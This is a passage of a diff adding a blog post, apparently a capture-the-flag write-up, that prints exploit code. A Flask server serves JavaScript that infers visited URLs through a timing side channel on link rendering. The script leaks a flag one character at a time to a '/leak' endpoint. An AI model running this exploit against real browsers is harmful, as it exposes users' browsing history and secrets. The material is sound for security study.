+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.textShadow = &#39;16px 16px 10px #fefffe&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.transform = &#39;perspective(100px) rotateY(37deg)&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                document.body.appendChild(targetLink);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                requestAnimationFrame(function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    requestAnimationFrame(function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        runTestStage(false);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    });
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                });
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            });
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function runTestStage (isExperimentStage) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                startCountingTicks();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                startOscillatingHref(testUrl);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                setTimeout(async function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    stopOscillatingHref();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    if (!isExperimentStage) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        controlTickCount = stopCountingTicks();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        runTestStage(true);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        return;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var experimentTickCount = stopCountingTicks();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    targetLink.remove();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var ratio = experimentTickCount / controlTickCount;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    console.log(&#34;RATIO&#34;, experimentTickCount, controlTickCount, ratio)
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var likelyVisited = ratio &lt; 0.7;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                   
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    async function sendBeacon(cond){
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        let url = opener ? opener.location.hash.substring(1) : &#34;flag{g68r|a&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        let [guess, current_guess] = url.split(&#39;|&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        if(cond){
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            await fetch(`/leak?flag=$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            if (opener) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                                opener.location.href = `/?query=${Math.random()}&amp;ratio=$</span><span style="color:#5af78e">{ratio}</span><span style="color:#5af78e">#$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">|a`;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        else {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            if (opener) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                                opener.location.href = `/?query=${Math.random()}&amp;ratio=$</span><span style="color:#5af78e">{ratio}</span><span style="color:#5af78e">#$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">|$</span><span style="color:#5af78e">{charset[charset.indexOf(current_guess)+1]}</span><span style="color:#5af78e">`;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    sendBeacon(likelyVisited);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.style.overflow = &#39;visible&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var outputDom = document.createElement(&#39;p&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(&#39;Result for &#39;));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var linkDom = document.createElement(&#39;a&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    linkDom.href = experimentUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    linkDom.appendChild(document.createTextNode(experimentUrl));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(linkDom);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(&#39;: likely &#39;));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var resultDom = document.createElement(&#39;strong&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    resultDom.innerHTML = likelyVisited ? &#39;VISITED&#39; : &#39;UNVISITED&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    resultDom.style.color = likelyVisited ? &#39;green&#39; : &#39;red&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(resultDom);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        &#39; (&#39; + experimentTickCount + &#39; ticks vs &#39; +
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        controlTickCount + &#39; ticks; ratio = &#39; +
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        Math.round(ratio * 100) + &#39;%).&#39;));
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.appendChild(outputDom);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var retryButton = document.createElement(&#39;button&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.innerHTML = &#39;Try Another URL&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.addEventListener(&#39;click&#39;, function (e) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        location.reload();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    });
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.appendChild(retryButton);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.focus();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                }, 500);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            } 
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var oscillateInterval;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var isPointingToBasisUrl = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function startOscillatingHref (testUrl) {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                oscillateInterval = setInterval(function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    isPointingToBasisUrl = !isPointingToBasisUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                }, 0);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function stopOscillatingHref () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                clearInterval(oscillateInterval);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.href = basisUrl;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                isPointingToBasisUrl = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var tickCount = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var tickRequestId;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function startCountingTicks () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                tickRequestId = requestAnimationFrame(function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    ++tickCount;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    startCountingTicks();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                });
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function stopCountingTicks () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                cancelAnimationFrame(tickRequestId);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var oldTickCount = tickCount;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                tickCount = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                return oldTickCount;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        })();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        setTimeout(function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var testButton = document.getElementById(&#39;testButton&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            testButton.click();
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }, 1000);
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">   
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> render_template_string(ex_html, CHALLENGE_URL<span style="color:#ff6ac1">=</span>URL,CHARSET<span style="color:#ff6ac1">=</span>CHARSET)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/poc&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">poc</span>():
+</span></span><span style="display:flex;"><span>    args <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>args<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;url&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> render_template_string(poc_html, url<span style="color:#ff6ac1">=</span>args, CHALLENGE_URL<span style="color:#ff6ac1">=</span>URL,CHARSET<span style="color:#ff6ac1">=</span>CHARSET)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/leak&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">leak</span>():
+</span></span><span style="display:flex;"><span>    flag <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>args<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;flag&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> flag[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>] <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;}&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(flag)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#ff6ac1">.</span>run(host<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;0.0.0.0&#39;</span>,port<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">1337</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 
         
           <div class="blog-tags">
